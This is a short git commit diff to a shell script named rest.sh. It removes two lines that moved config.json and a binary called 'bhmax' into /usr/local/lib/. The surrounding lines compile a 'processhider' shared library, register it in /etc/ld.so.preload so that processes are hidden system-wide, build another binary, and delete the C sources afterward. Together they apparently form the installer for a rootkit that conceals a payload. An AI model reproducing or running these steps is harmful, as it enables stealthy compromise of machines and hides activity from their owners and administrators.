7911a4ac4615d8294587807a96c3dbc3afdfd74a
hudahadoh <168321021+hudahadoh@users.noreply.github.com>
2024-05-22 02:18:53 -0400

    Update rest.sh

--- rest.sh
+++ rest.sh
@@ -8,8 +8,6 @@ chmod +x smtp.py
 gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
 chmod +x bhmax
 mv libprocess.so /usr/local/lib/
-mv config.json /usr/local/lib/
-mv bhmax /usr/local/lib/
 echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 gcc -o hi hi.c
 rm hi.c processhider.c
